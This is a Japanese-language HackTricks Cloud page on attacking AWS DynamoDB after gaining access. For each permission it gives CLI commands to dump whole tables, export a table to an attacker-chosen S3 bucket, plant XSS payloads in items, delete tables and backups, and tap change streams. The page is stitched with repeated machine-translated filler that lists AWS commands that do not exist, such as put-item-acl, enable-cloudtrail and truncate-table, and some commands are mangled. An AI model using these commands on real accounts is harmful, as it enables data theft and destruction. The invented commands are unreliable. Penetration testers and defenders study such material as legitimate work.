# AWS - DynamoDBのポストエクスプロイテーション

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社の広告を見たい**場合や、**最新バージョンのPEASSを入手したい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、PRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに参加してください。**

</details>

## DynamoDB

詳細については、次を参照してください：

{% content-ref url="../aws-services/aws-databases/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-databases/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

この権限を持つ攻撃者は、**主キーによってテーブルからアイテムを取得**することができます（テーブルのすべてのデータを要求することはできません）。つまり、主キーを知る必要があります（テーブルのメタデータを取得することでこれを取得できます）。

{% tabs %}
{% tab title="jsonファイル" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
以下は、AWS DynamoDBのポストエクスプロイテーションに関する内容です。

## テーブルのデータの読み取り

DynamoDBテーブルのデータを読み取るためには、以下の方法があります。

### 1. スキャン

`Scan`操作を使用して、テーブル内のすべてのアイテムを取得できます。ただし、大量のデータがある場合は時間がかかる可能性があります。

### 2. クエリ

`Query`操作を使用して、テーブル内のアイテムを特定の条件でフィルタリングして取得できます。これにより、データの取得が効率化されます。

### 3. バッチ読み取り

`BatchGetItem`操作を使用して、複数のアイテムを一度に取得できます。これにより、複数のキーを指定してデータを取得することができます。

## テーブルのデータの書き込み

DynamoDBテーブルにデータを書き込むためには、以下の方法があります。

### 1. PutItem

`PutItem`操作を使用して、新しいアイテムをテーブルに追加できます。アイテムが既に存在する場合は、上書きされます。

### 2. UpdateItem

`UpdateItem`操作を使用して、既存のアイテムの属性を更新できます。更新する属性と値を指定する必要があります。

### 3. DeleteItem

`DeleteItem`操作を使用して、テーブルからアイテムを削除できます。削除するアイテムのキーを指定する必要があります。

## テーブルのスキーマの変更

DynamoDBテーブルのスキーマを変更するためには、以下の方法があります。

### 1. CreateTable

`CreateTable`操作を使用して、新しいテーブルを作成できます。テーブルの属性とキーを指定する必要があります。

### 2. UpdateTable

`UpdateTable`操作を使用して、既存のテーブルの属性やキーを変更できます。変更する属性やキーを指定する必要があります。

### 3. DeleteTable

`DeleteTable`操作を使用して、テーブルを削除できます。削除するテーブルの名前を指定する必要があります。

## テーブルのアクセス制御

DynamoDBテーブルへのアクセスを制御するためには、以下の方法があります。

### 1. IAMポリシー

IAMポリシーを使用して、ユーザーやロールに対してテーブルへのアクセス権限を設定できます。

### 2. テーブルポリシー

テーブルポリシーを使用して、特定のアクションや条件に基づいてテーブルへのアクセスを制限できます。

### 3. VPCエンドポイント

VPCエンドポイントを使用して、VPC内のリソースからのみテーブルにアクセスできるように制限できます。

## テーブルの暗号化

DynamoDBテーブルのデータを暗号化するためには、以下の方法があります。

### 1. サーバーサイド暗号化

DynamoDBテーブルの作成時に、サーバーサイド暗号化を有効にすることができます。これにより、データが自動的に暗号化されます。

### 2. クライアントサイド暗号化

クライアントサイド暗号化を使用して、アプリケーション側でデータを暗号化してからDynamoDBに書き込むことができます。

### 3. KMSキーの使用

KMSキーを使用して、DynamoDBテーブルのデータを暗号化することができます。キーの管理とアクセス制御を行うことができます。

## テーブルの監査

DynamoDBテーブルの監査を行うためには、以下の方法があります。

### 1. CloudTrail

CloudTrailを使用して、DynamoDBテーブルへのアクセスや変更のログを取得できます。

### 2. VPCフローログ

VPCフローログを使用して、DynamoDBテーブルへのネットワークトラフィックを監視できます。

### 3. CloudWatch

CloudWatchを使用して、DynamoDBテーブルのメトリクスやログを監視できます。

{% endcode %}
{% endtab %}
{% endtabs %}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}



**潜在的な影響:** テーブル内の機密情報を特定することによる間接的な特権昇格

### `dynamodb:GetItem`

**前の権限と同様に**、この権限は潜在的な攻撃者がエントリのプライマリキーを指定して1つのテーブルから値を読み取ることを可能にします:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
{% endcode %}

この権限を使用すると、**`transact-get-items`** メソッドも使用できます。以下のように使用します：
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**潜在的な影響:** テーブル内の機密情報を特定することによる間接的な特権昇格

### `dynamodb:Query`

**前の権限と同様に**、この権限は潜在的な攻撃者がエントリのプライマリキーを指定して1つのテーブルから値を読み取ることを許可します。[比較のサブセット](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html)を使用することができますが、プライマリキーに対して許可されている比較は「EQ」のみです。したがって、リクエストで全体のDBを取得するための比較は使用できません。

{% tabs %}
{% tab title="json file" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**潜在的な影響:** テーブル内の機密情報を特定することによる間接的な特権昇格

### `dynamodb:Scan`

この権限を使用すると、テーブル全体を簡単にダンプすることができます。
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**潜在的な影響:** テーブル内の機密情報を特定することによる間接的な特権昇格

### `dynamodb:PartiQLSelect`

この権限を使用すると、テーブル全体を簡単にダンプすることができます。
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
この権限は、`batch-execute-statement` の実行も許可します。
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
しかし、値を指定して主キーを特定する必要があるため、それほど有用ではありません。

**潜在的な影響:** テーブル内の機密情報を特定することによる間接的な特権昇格

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

この権限により、攻撃者は自分が選んだS3バケットにテーブル全体を**エクスポート**することができます。
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
次のコマンドを使用して、テーブルがポイントインタイムリカバリが有効になっているかどうかを確認できます（訳注：コマンドの翻訳はしません）:

```plaintext
aws dynamodb describe-continuous-backups --table-name <table_name>
```

ポイントインタイムリカバリが有効になっている場合、テーブルのデータを特定の時点に戻すことができます。以下のコマンドを使用して、指定した時点にテーブルを復元できます（訳注：コマンドの翻訳はしません）:

```plaintext
aws dynamodb restore-table-to-point-in-time --source-table-name <table_name> --target-table-name <restored_table_name> --use-latest-restorable-time
```

このコマンドを実行すると、指定した時点までのデータが復元された新しいテーブルが作成されます。
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
もし有効にされていない場合、**有効にする必要があります**。そのためには、**`dynamodb:ExportTableToPointInTime`** の権限が必要です。
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**潜在的な影響:** テーブル内の機密情報を特定することによる間接的な特権昇格

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

これらの権限を持つ攻撃者は、**バックアップから新しいテーブルを作成**することができます（またはバックアップを作成して別のテーブルに復元することもできます）。そして、必要な権限を持っていれば、彼は**本番テーブルには存在しない可能性のある**バックアップから情報を確認することができます。
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**潜在的な影響:** テーブルバックアップ内の機密情報の特定による間接的な特権昇格

### `dynamodb:PutItem`

この権限は、ユーザーがテーブルに新しいアイテムを追加したり、既存のアイテムを新しいアイテムで置き換えたりすることを許可します。同じプライマリキーを持つアイテムが既に存在する場合、そのアイテム全体が新しいアイテムで置き換えられます。プライマリキーが存在しない場合、指定されたプライマリキーを持つ新しいアイテムが作成されます。

{% tabs %}
{% tab title="XSSの例" %}
{% code overflow="wrap" %}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="Japanese" %}

# AWS DynamoDBのポストエクスプロイテーション

## テーブルのデータの読み取り

DynamoDBテーブルのデータを読み取るためには、以下の手法を使用できます。

### 1. scanコマンドを使用する

scanコマンドを使用して、テーブル内のすべてのアイテムを取得できます。

```plaintext
aws dynamodb scan --table-name <table_name>
```

### 2. queryコマンドを使用する

queryコマンドを使用して、テーブル内の特定のアイテムを取得できます。

```plaintext
aws dynamodb query --table-name <table_name> --key-condition-expression "<condition_expression>"
```

### 3. get-itemコマンドを使用する

get-itemコマンドを使用して、テーブル内の特定のアイテムを取得できます。

```plaintext
aws dynamodb get-item --table-name <table_name> --key "<key_expression>"
```

## テーブルのデータの書き込み

DynamoDBテーブルにデータを書き込むためには、以下の手法を使用できます。

### 1. put-itemコマンドを使用する

put-itemコマンドを使用して、テーブルに新しいアイテムを追加できます。

```plaintext
aws dynamodb put-item --table-name <table_name> --item "<item_data>"
```

### 2. update-itemコマンドを使用する

update-itemコマンドを使用して、テーブル内の既存のアイテムを更新できます。

```plaintext
aws dynamodb update-item --table-name <table_name> --key "<key_expression>" --update-expression "<update_expression>"
```

### 3. delete-itemコマンドを使用する

delete-itemコマンドを使用して、テーブル内の特定のアイテムを削除できます。

```plaintext
aws dynamodb delete-item --table-name <table_name> --key "<key_expression>"
```

## テーブルのスキーマの変更

DynamoDBテーブルのスキーマを変更するためには、以下の手法を使用できます。

### 1. update-tableコマンドを使用する

update-tableコマンドを使用して、テーブルのプロビジョニングされたスループットキャパシティやインデックスを変更できます。

```plaintext
aws dynamodb update-table --table-name <table_name> --provisioned-throughput "<throughput_settings>"
```

### 2. create-tableコマンドを使用する

create-tableコマンドを使用して、新しいテーブルを作成できます。

```plaintext
aws dynamodb create-table --table-name <table_name> --attribute-definitions "<attribute_definitions>" --key-schema "<key_schema>" --provisioned-throughput "<throughput_settings>"
```

### 3. delete-tableコマンドを使用する

delete-tableコマンドを使用して、テーブルを削除できます。

```plaintext
aws dynamodb delete-table --table-name <table_name>
```

## テーブルのデータのバックアップと復元

DynamoDBテーブルのデータをバックアップし、復元するためには、以下の手法を使用できます。

### 1. create-backupコマンドを使用する

create-backupコマンドを使用して、テーブルのバックアップを作成できます。

```plaintext
aws dynamodb create-backup --table-name <table_name> --backup-name <backup_name>
```

### 2. restore-table-from-backupコマンドを使用する

restore-table-from-backupコマンドを使用して、バックアップからテーブルを復元できます。

```plaintext
aws dynamodb restore-table-from-backup --target-table-name <table_name> --backup-arn <backup_arn>
```

### 3. delete-backupコマンドを使用する

delete-backupコマンドを使用して、バックアップを削除できます。

```plaintext
aws dynamodb delete-backup --backup-arn <backup_arn>
```

## テーブルのデータの暗号化

DynamoDBテーブルのデータを暗号化するためには、以下の手法を使用できます。

### 1. enable-kms-encryptionコマンドを使用する

enable-kms-encryptionコマンドを使用して、テーブルのデータをKMSキーで暗号化できます。

```plaintext
aws dynamodb enable-kms-encryption --table-name <table_name> --kms-master-key-id <kms_key_id>
```

### 2. disable-kms-encryptionコマンドを使用する

disable-kms-encryptionコマンドを使用して、テーブルのデータの暗号化を無効にできます。

```plaintext
aws dynamodb disable-kms-encryption --table-name <table_name>
```

### 3. update-tableコマンドを使用する

update-tableコマンドを使用して、テーブルの暗号化設定を変更できます。

```plaintext
aws dynamodb update-table --table-name <table_name> --sse-specification "<encryption_settings>"
```

## テーブルのデータのアクセス制御

DynamoDBテーブルのデータへのアクセスを制御するためには、以下の手法を使用できます。

### 1. put-item-aclコマンドを使用する

put-item-aclコマンドを使用して、テーブル内の特定のアイテムのアクセス制御リストを設定できます。

```plaintext
aws dynamodb put-item-acl --table-name <table_name> --item "<item_data>" --acl "<acl_settings>"
```

### 2. get-item-aclコマンドを使用する

get-item-aclコマンドを使用して、テーブル内の特定のアイテムのアクセス制御リストを取得できます。

```plaintext
aws dynamodb get-item-acl --table-name <table_name> --key "<key_expression>"
```

### 3. delete-item-aclコマンドを使用する

delete-item-aclコマンドを使用して、テーブル内の特定のアイテムのアクセス制御リストを削除できます。

```plaintext
aws dynamodb delete-item-acl --table-name <table_name> --key "<key_expression>"
```

## テーブルのデータの監査

DynamoDBテーブルのデータの監査を行うためには、以下の手法を使用できます。

### 1. enable-cloudtrailコマンドを使用する

enable-cloudtrailコマンドを使用して、テーブルのデータの監査を有効にできます。

```plaintext
aws dynamodb enable-cloudtrail --table-name <table_name> --cloudtrail-arn <cloudtrail_arn>
```

### 2. disable-cloudtrailコマンドを使用する

disable-cloudtrailコマンドを使用して、テーブルのデータの監査を無効にできます。

```plaintext
aws dynamodb disable-cloudtrail --table-name <table_name>
```

### 3. describe-cloudtrailコマンドを使用する

describe-cloudtrailコマンドを使用して、テーブルのデータの監査設定を表示できます。

```plaintext
aws dynamodb describe-cloudtrail --table-name <table_name>
```

## テーブルのデータの脆弱性診断

DynamoDBテーブルのデータの脆弱性を診断するためには、以下の手法を使用できます。

### 1. scanコマンドを使用する

scanコマンドを使用して、テーブル内のデータをスキャンし、脆弱性を特定できます。

```plaintext
aws dynamodb scan --table-name <table_name> --filter-expression "<filter_expression>"
```

### 2. queryコマンドを使用する

queryコマンドを使用して、テーブル内のデータをクエリし、脆弱性を特定できます。

```plaintext
aws dynamodb query --table-name <table_name> --key-condition-expression "<condition_expression>"
```

### 3. get-itemコマンドを使用する

get-itemコマンドを使用して、テーブル内の特定のデータを取得し、脆弱性を特定できます。

```plaintext
aws dynamodb get-item --table-name <table_name> --key "<key_expression>"
```

## テーブルのデータの漏洩防止

DynamoDBテーブルのデータの漏洩を防止するためには、以下の手法を使用できます。

### 1. アクセス制御ポリシーの設定

適切なアクセス制御ポリシーを設定することで、テーブルのデータへのアクセスを制限できます。

### 2. データの暗号化

テーブルのデータを暗号化することで、データの漏洩を防止できます。

### 3. 監査ログの有効化

テーブルのデータの監査ログを有効化することで、データの不正アクセスを検知できます。

{% endcode %}
{% endtab %}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**潜在的な影響:** DynamoDBテーブルにデータを追加/変更することで、さらなる脆弱性/バイパスの悪用が可能になる。

### `dynamodb:UpdateItem`

この権限は、アイテムの既存の属性を変更したり、アイテムに新しい属性を追加することができます。アイテム全体を置き換えるわけではありません。指定された属性のみを更新します。テーブルに主キーが存在しない場合、操作は指定された主キーを持つ新しいアイテムを作成し、更新式で指定された属性を設定します。
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="Japanese" %}

# AWS DynamoDBのポストエクスプロイテーション

## テーブルのデータの読み取り

DynamoDBテーブルのデータを読み取るためには、以下の手法を使用できます。

### 1. scanコマンドを使用する

scanコマンドを使用して、テーブル内のすべてのアイテムを取得できます。

```plaintext
aws dynamodb scan --table-name <table_name>
```

### 2. queryコマンドを使用する

queryコマンドを使用して、テーブル内の特定のアイテムを取得できます。

```plaintext
aws dynamodb query --table-name <table_name> --key-condition-expression "<condition_expression>"
```

### 3. get-itemコマンドを使用する

get-itemコマンドを使用して、テーブル内の特定のアイテムを取得できます。

```plaintext
aws dynamodb get-item --table-name <table_name> --key "<key_expression>"
```

## テーブルのデータの書き込み

DynamoDBテーブルにデータを書き込むためには、以下の手法を使用できます。

### 1. put-itemコマンドを使用する

put-itemコマンドを使用して、テーブルに新しいアイテムを追加できます。

```plaintext
aws dynamodb put-item --table-name <table_name> --item "<item_data>"
```

### 2. update-itemコマンドを使用する

update-itemコマンドを使用して、テーブル内の既存のアイテムを更新できます。

```plaintext
aws dynamodb update-item --table-name <table_name> --key "<key_expression>" --update-expression "<update_expression>"
```

### 3. delete-itemコマンドを使用する

delete-itemコマンドを使用して、テーブル内の特定のアイテムを削除できます。

```plaintext
aws dynamodb delete-item --table-name <table_name> --key "<key_expression>"
```

## テーブルのスキーマの変更

DynamoDBテーブルのスキーマを変更するためには、以下の手法を使用できます。

### 1. update-tableコマンドを使用する

update-tableコマンドを使用して、テーブルのプロビジョニングされたスループットキャパシティやインデックスを変更できます。

```plaintext
aws dynamodb update-table --table-name <table_name> --provisioned-throughput "<throughput_settings>"
```

### 2. create-tableコマンドを使用する

create-tableコマンドを使用して、新しいテーブルを作成できます。

```plaintext
aws dynamodb create-table --table-name <table_name> --attribute-definitions "<attribute_definitions>" --key-schema "<key_schema>" --provisioned-throughput "<throughput_settings>"
```

### 3. delete-tableコマンドを使用する

delete-tableコマンドを使用して、テーブルを削除できます。

```plaintext
aws dynamodb delete-table --table-name <table_name>
```

## テーブルのデータのバックアップと復元

DynamoDBテーブルのデータをバックアップし、復元するためには、以下の手法を使用できます。

### 1. create-backupコマンドを使用する

create-backupコマンドを使用して、テーブルのバックアップを作成できます。

```plaintext
aws dynamodb create-backup --table-name <table_name> --backup-name <backup_name>
```

### 2. restore-table-from-backupコマンドを使用する

restore-table-from-backupコマンドを使用して、バックアップからテーブルを復元できます。

```plaintext
aws dynamodb restore-table-from-backup --target-table-name <table_name> --backup-arn <backup_arn>
```

### 3. delete-backupコマンドを使用する

delete-backupコマンドを使用して、バックアップを削除できます。

```plaintext
aws dynamodb delete-backup --backup-arn <backup_arn>
```

## テーブルのアクセス制御の設定

DynamoDBテーブルのアクセス制御を設定するためには、以下の手法を使用できます。

### 1. put-item-aclコマンドを使用する

put-item-aclコマンドを使用して、テーブル内の特定のアイテムのアクセス制御を設定できます。

```plaintext
aws dynamodb put-item-acl --table-name <table_name> --key "<key_expression>" --acl "<acl_settings>"
```

### 2. get-item-aclコマンドを使用する

get-item-aclコマンドを使用して、テーブル内の特定のアイテムのアクセス制御を取得できます。

```plaintext
aws dynamodb get-item-acl --table-name <table_name> --key "<key_expression>"
```

### 3. delete-item-aclコマンドを使用する

delete-item-aclコマンドを使用して、テーブル内の特定のアイテムのアクセス制御を削除できます。

```plaintext
aws dynamodb delete-item-acl --table-name <table_name> --key "<key_expression>"
```

## テーブルの暗号化の設定

DynamoDBテーブルのデータを暗号化するためには、以下の手法を使用できます。

### 1. enable-table-encryptionコマンドを使用する

enable-table-encryptionコマンドを使用して、テーブルのデータを暗号化できます。

```plaintext
aws dynamodb enable-table-encryption --table-name <table_name> --encryption-type <encryption_type> --kms-master-key-id <kms_key_id>
```

### 2. disable-table-encryptionコマンドを使用する

disable-table-encryptionコマンドを使用して、テーブルのデータの暗号化を無効にできます。

```plaintext
aws dynamodb disable-table-encryption --table-name <table_name>
```

### 3. describe-tableコマンドを使用する

describe-tableコマンドを使用して、テーブルの暗号化設定を取得できます。

```plaintext
aws dynamodb describe-table --table-name <table_name>
```

## テーブルの監査ログの設定

DynamoDBテーブルの監査ログを設定するためには、以下の手法を使用できます。

### 1. enable-table-audit-loggingコマンドを使用する

enable-table-audit-loggingコマンドを使用して、テーブルの監査ログを有効にできます。

```plaintext
aws dynamodb enable-table-audit-logging --table-name <table_name> --audit-destination <destination_type> --audit-stream-arn <stream_arn>
```

### 2. disable-table-audit-loggingコマンドを使用する

disable-table-audit-loggingコマンドを使用して、テーブルの監査ログを無効にできます。

```plaintext
aws dynamodb disable-table-audit-logging --table-name <table_name>
```

### 3. describe-tableコマンドを使用する

describe-tableコマンドを使用して、テーブルの監査ログ設定を取得できます。

```plaintext
aws dynamodb describe-table --table-name <table_name>
```

## テーブルのキャッシュの設定

DynamoDBテーブルのキャッシュを設定するためには、以下の手法を使用できます。

### 1. update-tableコマンドを使用する

update-tableコマンドを使用して、テーブルのキャッシュ設定を変更できます。

```plaintext
aws dynamodb update-table --table-name <table_name> --caching-configuration "<caching_configuration>"
```

### 2. describe-tableコマンドを使用する

describe-tableコマンドを使用して、テーブルのキャッシュ設定を取得できます。

```plaintext
aws dynamodb describe-table --table-name <table_name>
```

### 3. delete-tableコマンドを使用する

delete-tableコマンドを使用して、テーブルのキャッシュを削除できます。

```plaintext
aws dynamodb delete-table --table-name <table_name>
```

## テーブルのパフォーマンスの最適化

DynamoDBテーブルのパフォーマンスを最適化するためには、以下の手法を使用できます。

### 1. update-tableコマンドを使用する

update-tableコマンドを使用して、テーブルのプロビジョニングされたスループットキャパシティを変更できます。

```plaintext
aws dynamodb update-table --table-name <table_name> --provisioned-throughput "<throughput_settings>"
```

### 2. describe-tableコマンドを使用する

describe-tableコマンドを使用して、テーブルのパフォーマンス設定を取得できます。

```plaintext
aws dynamodb describe-table --table-name <table_name>
```

### 3. delete-tableコマンドを使用する

delete-tableコマンドを使用して、テーブルを削除できます。

```plaintext
aws dynamodb delete-table --table-name <table_name>
```

## テーブルのインデックスの設定

DynamoDBテーブルのインデックスを設定するためには、以下の手法を使用できます。

### 1. update-tableコマンドを使用する

update-tableコマンドを使用して、テーブルのインデックスを変更できます。

```plaintext
aws dynamodb update-table --table-name <table_name> --attribute-definitions "<attribute_definitions>" --global-secondary-index-updates "<index_updates>"
```

### 2. describe-tableコマンドを使用する

describe-tableコマンドを使用して、テーブルのインデックス設定を取得できます。

```plaintext
aws dynamodb describe-table --table-name <table_name>
```

### 3. delete-tableコマンドを使用する

delete-tableコマンドを使用して、テーブルを削除できます。

```plaintext
aws dynamodb delete-table --table-name <table_name>
```

## テーブルの容量の監視

DynamoDBテーブルの容量を監視するためには、以下の手法を使用できます。

### 1. describe-tableコマンドを使用する

describe-tableコマンドを使用して、テーブルの容量情報を取得できます。

```plaintext
aws dynamodb describe-table --table-name <table_name>
```

### 2. cloudwatchコマンドを使用する

cloudwatchコマンドを使用して、テーブルの容量メトリクスを取得できます。

```plaintext
aws cloudwatch get-metric-statistics --namespace "AWS/DynamoDB" --metric-name <metric_name> --dimensions "Name=TableName,Value=<table_name>" --statistics <statistics> --start-time <start_time> --end-time <end_time> --period <period>
```

### 3. delete-tableコマンドを使用する

delete-tableコマンドを使用して、テーブルを削除できます。

```plaintext
aws dynamodb delete-table --table-name <table_name>
```

## テーブルのパフォーマンスのトラブルシューティング

DynamoDBテーブルのパフォーマンスの問題をトラブルシューティングするためには、以下の手法を使用できます。

### 1. describe-tableコマンドを使用する

describe-tableコマンドを使用して、テーブルのパフォーマンス設定を取得できます。

```plaintext
aws dynamodb describe-table --table-name <table_name>
```

### 2. cloudwatchコマンドを使用する

cloudwatchコマンドを使用して、テーブルのパフォーマンスメトリクスを取得できます。

```plaintext
aws cloudwatch get-metric-statistics --namespace "AWS/DynamoDB" --metric-name <metric_name> --dimensions "Name=TableName,Value=<table_name>" --statistics <statistics> --start-time <start_time> --end-time <end_time> --period <period>
```

### 3. delete-tableコマンドを使用する

delete-tableコマンドを使用して、テーブルを削除できます。

```plaintext
aws dynamodb delete-table --table-name <table_name>
```

## テーブルのデータの漏洩の防止

DynamoDBテーブルのデータの漏洩を防止するためには、以下の手法を使用できます。

### 1. アクセス制御ポリシーの設定

適切なアクセス制御ポリシーを設定して、不正なアクセスを防止します。

### 2. データの暗号化

データを暗号化して、不正なアクセスから保護します。

### 3. 監査ログの有効化

監査ログを有効にして、データのアクセス履歴を追跡します。

## テーブルのデータの復旧

DynamoDBテーブルのデータを復旧するためには、以下の手法を使用できます。

### 1. バックアップの利用

バックアップからデータを復元します。

### 2. レプリケーションの利用

レプリケーションを使用して、データを復元します。

### 3. データの再作成

必要なデータを再作成します。

## テーブルのデータの消去

DynamoDBテーブルのデータを消去するためには、以下の手法を使用できます。

### 1. delete-itemコマンドを使用する

delete-itemコマンドを使用して、テーブル内の特定のアイテムを削除します。

```plaintext
aws dynamodb delete-item --table-name <table_name> --key "<key_expression>"
```

### 2. delete-tableコマンドを使用する

delete-tableコマンドを使用して、テーブルを削除します。

```plaintext
aws dynamodb delete-table --table-name <table_name>
```

### 3. truncate-tableコマンドを使用する

truncate-tableコマンドを使用して、テーブル内のすべてのアイテムを削除します。

```plaintext
aws dynamodb truncate-table --table-name <table_name>
```

## テーブルのデータの改ざんの検知

DynamoDBテーブルのデータの改ざんを検知するためには、以下の手法を使用できます。

### 1. 監査ログの分析

監査ログを分析して、データの改ざんを検知します。

### 2. データのハッシュ値の比較

データのハッシュ値を比較して、改ざんを検知します。

###
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**潜在的な影響:** DynamoDBテーブル内のデータを追加/変更することで、さらなる脆弱性/バイパスの悪用が可能になる

### `dynamodb:DeleteTable`

この権限を持つ攻撃者は、DynamoDBテーブルを削除することができ、データの損失を引き起こすことができます。
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**潜在的な影響**: 削除されたテーブルに依存するデータの損失とサービスの中断。

### `dynamodb:DeleteBackup`

この権限を持つ攻撃者は、災害復旧シナリオの場合にデータの損失を引き起こす可能性があるため、DynamoDBのバックアップを削除することができます。
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**潜在的な影響**: データの損失と災害復旧シナリオでのバックアップからの回復の不可能性。

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: これが実際に機能するかテストする
{% endhint %}

これらの権限を持つ攻撃者は、DynamoDBテーブルにストリームを有効にし、テーブルの変更をストリーミングし、そのストリームにアクセスしてテーブルの変更をリアルタイムで監視することができます。これにより、攻撃者はデータの変更を監視し、データの漏洩の可能性があります。

1. DynamoDBテーブルにストリームを有効にする：
```bash
bashCopy codeaws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. ARNおよびその他の詳細を取得するためのストリームの説明:
```bash
bashCopy codeaws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. ストリームARNを使用してシャードイテレータを取得します：
```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. シャードイテレータを使用してストリームからデータにアクセスし、データを持ち出します。
```bash
bashCopy codeaws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**潜在的な影響**: DynamoDBテーブルの変更のリアルタイム監視とデータ漏洩。

<details>

<summary><strong>ハックトリックスをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
